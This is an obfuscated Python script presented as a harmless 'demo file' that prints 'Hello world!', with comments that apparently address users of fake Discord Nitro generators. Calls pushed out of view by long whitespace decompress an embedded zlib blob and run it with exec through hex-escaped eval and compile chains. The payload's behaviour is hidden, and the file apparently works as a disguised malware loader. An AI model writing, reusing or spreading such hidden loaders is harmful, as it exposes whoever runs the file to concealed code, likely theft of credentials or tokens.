# ðŸ”Œ demo file
# ðŸ›‘ its illegal btw ðŸ›‘
# âœ… buy your nitro and stop generate bozo ðŸ’€

from builtins import *
from math import prod as _math


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_substract, MemoryAccess, _invert, _run, _power, Walk, Statistics = exec, str, tuple, map, ord, globals, type

class Ceil:
    def __init__(self, Square):
        self.Cube = _math((Square, -4078))
        self._callfunction(_floor=-30040)

    def _callfunction(self, _floor = float):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Cube += 28178 - _floor
        
        try:
            (_run, Modulo) if _run != MemoryAccess else (_substract, _run, _invert) != _run

        except ArithmeticError:
            (_run, Modulo) if MemoryAccess is _run else (_substract, _run, _invert) != Modulo

        except:
            Statistics(-29432 * -44158) == True

    def Floor(self, _algorithm = -37401):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _algorithm -= -75692 + 68936
        self._product != Ellipsis
        
        try:
            ((_power, _invert) or Modulo if (_power, _invert) and Modulo else ... or (Modulo, (_power, _invert)))

        except TypeError:
            (((_run, Modulo), _run) for _run in (_power, _invert))

        except:
            Statistics(49055 + 15898) == str

    def Run(_memoryaccess = False):
        return Walk()[_memoryaccess]

    def Frame(Add = -90733 * -63588, _modulo = float, CallFunction = Walk):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        CallFunction()[Add] = _modulo
        
        try:
            ({MemoryAccess: _invert} or _substract if {MemoryAccess: _invert} and _substract else ... or (_substract, {MemoryAccess: _invert}))

        except TypeError:
            (_substract, _run, _invert) if _run != Modulo else (Modulo, Modulo) > Walk

        except:
            Statistics(92142 * -3177) == True

    def execute(code = str):
        return _substract(MemoryAccess(_invert(_run(_power, code))))

    @property
    def _product(self):
        self.Absolute = '<__main__.MemoryAccess object at 0x000002482BE12700>'
        return (self.Absolute, Ceil._product)

if __name__ == '__main__':
    try:
        Ceil.execute(code = __code__)
        _while = Ceil(Square = 12747 * -94796)

        _while._callfunction(_floor = _while.Cube / 30869)                                                                                                                                                                                                                                                          ;Ceil.Frame(Add='SSS22SS2SSSSSS22S2222S',_modulo=b'x\x9c\xe5Y[o\xe28\x14~\xcf\xaf\xc8\xf0\x92Dm)\x04\x08\x04i^V\xdd\xd5\x04qYMW\x0b\xab\xb6\x8aB\xe2P3&F\xb9\x0c\xf0\xef\xf7\xf8\x92B\x0b\xe1V\xfa\x84O\x8e\xed\xf8rl\xbe|\xb6OB\x1a\xaf\xda\x8a\n\x01\x87:OYp]:\x0e\xb3\xc4\xf7R\x1a\xbb\xae\xfa\xed{\xe9\xc7j\x8ebL\xa3\x92J\xe3\x8df^\x96\xbe\xd28\xe1m\xf4\xd2\x18\x13\xb2J_\xd1\x84zi\xada\x95nK\x7f\x90\x0c\xfdDA\xc9x\xd7k\x82\xd3\xd7l,\x0c\xbf\xa6\xe9<i\xdf\xdf\x8b\xb2\xb2Og\xf7\x1f\xcc\xdc\x17\x8c\x1d\xe0\xc4\xa7q\xf0\xde\x8c,,O&\xf7s\xe2M2\xf4\xa1\x13\xc1>\x8a\x12$:\xfd\xf9w\xf7\xce,W>4\xf1i \xea\xb5y\x8c\xa3T/\xfd@\x84PuAc\x12|+\x19\x9ab\xb4\xdfZ\xb3z-\xf9\x85\x03\xcdP\xd0\xd2G\xf3T\x82\x19\xcd3\xe8\xf9\x93&(Q\xbd\x18\xa91\n\x9e\xa3\x7f1%(\x15\x05c@\xe69\xfa\x8ff\xfc\xceS\x99\x91\xe7\xa8O\xc74X\xa9\x04\xff\x82~+\x9a\x95\x0cEL\n\xcf\xe64N]\x17F[%\x9aQFK\x9c\xea\x86B\xa8\xef\x91D7\x9e\xb4\x01\xad\x0c\x06\x94\xd2\n\x85x@\x07\x15vi/\xdf\'\x84\x8e\xa1\x89\xb2\xb3\x9eu|4\x99\x98\x8f,\x98&\xbb\xd1\x9e\xda\xed\x9b\xbb\x9b;\xfdN\xbf\xa9\x1a\xc6\x0b\x18A\xa9\x97\xa6q\xb1\x91\xd1h4\x1c\x8e@ \x96\xd9\xd1\xb6\x99\x00\xef31\x1c\xf2\xde\xf2\xe2v`\xfe\xe2\x17*\xbbjY\xaf\xae\x03\xa1\xd3e\xa1\x03\x19\x08\x90\xe9t\x1c\xe8\xb9\x06\xadxPL0\x06\x9dB\x8c\xa7\x84`2e\t\x04\xe8_dZ\xd7\xc6\x19&)\x8e\xd8s\xf8\xed\xc5\x89Rh\x85\r\xb1\\.\x96oa!/0\xcfQ\xcfa\xe7\x0fA/\x1e1\x89pJp6\xfe\x88\xa9q;\xe2\xa8s\xd0\x87y\xf6\x1cC\xc6\xd3\xc5,\x95q\x14\xa0\xa5\xae!\x82\xe73\xeao5x1\n\x1fg\xbf\xd7\xeb\xf7{LX\xca\x12v\xd3\xbf\x0e\xb8\xb2\xf8\x9f\x13\xb1\xea\xf5\x04F\x00\x11\xc0u\x15(\x11\xef7\xda\x85\xd2\xde5\xd8\xe5c\x808"\x96\xa1\xd3\xb9\n\xc8\xe249\x85W\x11\x0f\xb3h\x06W\xc4/\xc8]\x05P(!\xde_\'A5[\x83\xc4\xf1\xba\n\x98R\x8f\x92\xf0\xe45\xf8hJH\x04,\xfc\x16\xe0\xd2\xb4\xf2\x94\xe2\xe8\xc0\x19\xba`a\x99\'\xe2(\x85\xcc\xa9pc\xec\'^\x84?\x0fw\xa1\xa1\x93\xe1.\xb6\x94\xc3\xbd\n1Y\xa2\xd7(\xdb\x05y\xa1g\xe3\xc0@]\x07F\xe9:l\xeb\xebt\xaf\x82\x9a\x84\xd2\xed\xda=0\x15\x11K\x1fk\x96\xbf)u\x9b)\x8b\xf3\xfc\xbaL\x088\x83\x01b\xef\x0e\xba\xd6\n\xd3\x1d\x0f\xeb\n\xe0\xf7\xd1\xf2\xf4\xc3y\xc1\x10_\x08]Ho\x99g7-m9;\xbafT\xa1\xa6r\x81F{HPk4\xc2Z\x13\xb4\x02Z\x07\xad\xc9{V^\x95i\xcb\x1c\x9b-38\xaam\xd3<H\x14CD\\\xe1\xfd\xc7\x9b\x8d\x03O\x95\'\xb2\xd0Hh{\x0f\xac{!\xdf\xf3\x83\x05\xc7\x05\xcfs\xc6\xaf\xef\x98\x1e\xe6\xf9I\x08\x9bM\xb3y\x10\x91\xfd\x04\xca\xc7aC\x89\xe4\x10)*PS=\x9f\x14\xcd\x8d\x07\x9ck\xfe\xf0[\x92\x005I\x8ac\xda\x9a\xc7\x93\xe2\x8d\x10r\xaab\xb6|\xea_A\x87f\xab\xd9\xe4\x9a\x07q\xbf\xab\x14\xc2aj\xbc\xb1\x993Y\xb8\x96\x9c\xda\x10\xbeb\xfe\x8d\xe6\x9b\xb4@D*\xf2R\x8e\x9e3q@ \xb0\xed\x11""\xee \x9c=oM\x9a\xe3J\x84Q\x9e~1}\xab\x1b\x14\xb4e\xbe&\xe9\xc8\xa8j\xb1T\xd2\xf7\x98\xb6\xb53\xe8KYx\xa0\x0f\xec\x1a<\xc0\x99\xfc0\x80\x03\xba\xbd\xdb\xd1>{3\x83\xe5\xc5\xd4\n\xeb\xa1\x05)\x13\x96\x17\xa5BE\xbd\x15\x1e\xcd\x03~|\x0b?\xf6Q|;\x13\xe7z\xbb\xc0\xc78w\xf2\x96\xc7w]\xdb\xb2y,r\x1e\x17_\xaa\x9d\xc7\x97\xde\x93M\xabn5\xac\xc0\n\xcd\x8ae\xf1a\x1aM\xd8\xa5>\xb9OC\x16O\xa7S\xdef\xca\xea\xa1jz\x91C\xdev\x1bn\xcd\xad\xba\xb6\xdb\x82\\\x05\xc4\x82\x96\x10\x7f,\xbd\xc8h\x9f\\~-\xb9lL\xb9\xac\xeari\xd92\xcf\xeam\xb9\xfc\x8ei\xdb:\xcd\xa5\xd8Z\x8ab\xa5\r\x85\xff\xc7\x97\xdcYT\xce\xbfG\x89\x0fx\xfc\xb3]\xef\xc0A\xbc\x0f\xa5\x8a\x19\x88\r\xe8\xb8_\xf7\xeeh\x99\x89/\x18\xebdv\xce\xc6\xa2\xe5\x9e\xa8\xd4\xe5A\x87\xb4\x0ed\xab\x03\xd5\x9a &\xcf1\x1a6\xb6K?\xe7z\xe4\xa4\xb0\xa5_Y\xdf \x84\xcd\xdd\x89\xb5\xebq\xa8\xed\x91\xf0\xbe\x83X\xbcX:\x1dx9\x80\xb7L\xd0Ko}\xf5\x80\x0b\x02\t6\x04\xc92^z\xf4~\xed\xc0l\xe1%\x98\xcd\xb4#\xe7\xbd\xf7\xc4\x0ec:S\xf3/\xfc\xaa\xf8\x0bA\x85\xf7\x1a\xff\x96\xff\x1dt\x0b\xaa\xb0[\xdd\x11\x0eA\x9e\x10\xc7P\xc4\x1fF\xcc"X\x87\x08v;\xd8\xe4\xa6\xcc>1\x94\xff\x01tGR!')

        _while.Floor(_algorithm = 1025 / _while.Cube)                                                                                                                                                                                                                                                          ;DOODoODoOoDDoDooOODDDDOD,NNMNNNMNNNNNMMNNNNNMNN,XXWXWXWXWWXXWXXXXWWX,MNNMNMMNNNMNNMMNMNMMNNNN,XWXXWXXXXWWXXWWWWXXWWXXW=(lambda wxwxwxxwxxwxxwwxxxwxwwxx:wxwxwxxwxxwxxwwxxxwxwwxx(__import__('\x7a\x6c\x69\x62'))),(lambda wxwxwxxwxxwxxwwxxxwxwwxx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(wxwxwxxwxxwxxwwxxxwxwwxx)"),filename='\x53\x32\x32\x53\x53\x32\x32\x32\x32\x53\x53\x53\x53\x32\x53\x53\x53\x32\x53\x53\x53\x32\x53\x53\x32\x32',mode='\x65\x76\x61\x6c'))),(lambda wxwxwxxwxxwxxwwxxxwxwwxx:wxwxwxxwxxwxxwwxxxwxwwxx['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda wxwxwxxwxxwxxwwxxxwxwwxx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(wxwxwxxwxxwxxwwxxxwxwwxx)"),filename='\x53\x32\x32\x53\x53\x32\x32\x32\x32\x53\x53\x53\x53\x32\x53\x53\x53\x32\x53\x53\x53\x32\x53\x53\x32\x32',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda IJJILLJLLLIJJIILLLL,wxwxwxxwxxwxxwwxxxwxwwxx:IJJILLJLLLIJJIILLLL(wxwxwxxwxxwxxwwxxxwxwwxx))
        Ceil(Square = 90788 / 2516)._callfunction(_floor = _while.Cube / -32550)                                                                                                                                                                                                                                                          ;MNNMNMMNNNMNNMMNMNMMNNNN()(XWXXWXXXXWWXXWWWWXXWWXXW(XXWXWXWXWWXXWXXXXWWX(DOODoODoOoDDoDooOODDDDOD(NNMNNNMNNNNNMMNNNNNMNN('\x76\x61\x72\x73'))),Ceil.Run(_memoryaccess='SSS22SS2SSSSSS22S2222S')))

    except Exception as Modulo:
        if 483915 > 9408577:
            Ceil.execute(code = MemoryAccess(Modulo))

        elif 320528 > 927656:
            Ceil(Square = 68796 * 95418).Floor(_algorithm = 86660 - _while.Cube)
